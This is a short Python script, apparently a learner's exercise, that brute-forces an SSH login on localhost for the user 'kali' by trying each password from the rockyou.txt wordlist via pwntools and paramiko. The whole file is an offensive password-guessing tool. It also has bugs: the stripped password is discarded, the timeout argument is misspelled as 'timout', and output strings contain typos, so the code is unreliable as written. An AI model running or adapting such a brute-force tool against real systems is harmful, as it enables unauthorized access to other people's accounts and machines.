from pwn import *
import paramiko

host = "127.0.0.1" #tests local host
username = "kali" #this is my own system's username, will change 
attempts = 0 #keep log of the attempts made/how many requests it's taken to authenticate

#will open the file and store it as password list
with open("rockyou.txt", "r") as password_list:
	for password in password_list:
		password.strip("\n")
		try:
			print(f"{attempts} Attempting password: {password}")
			response = ssh(host=host, user=username, password=password, timout=1)
			if response.connected():
				print(f"[>] Valic password found: {password}")
				response.close()
				break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
			print("[>] Invalid password!")
			attempts += 1